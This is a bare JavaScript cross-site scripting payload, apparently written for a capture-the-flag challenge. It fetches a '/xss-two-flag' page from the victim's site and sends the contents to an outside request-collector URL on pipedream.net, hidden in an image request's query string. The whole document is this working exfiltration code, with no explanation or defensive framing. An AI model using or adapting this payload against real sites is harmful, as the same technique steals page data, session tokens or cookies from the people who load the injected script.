fetch('/xss-two-flag')
  .then(r => r.text())
  .then(data => {
    new Image().src = "https://eo8y1y4ac51qvd9.m.pipedream.net/?flag=" + encodeURIComponent(data);
  });
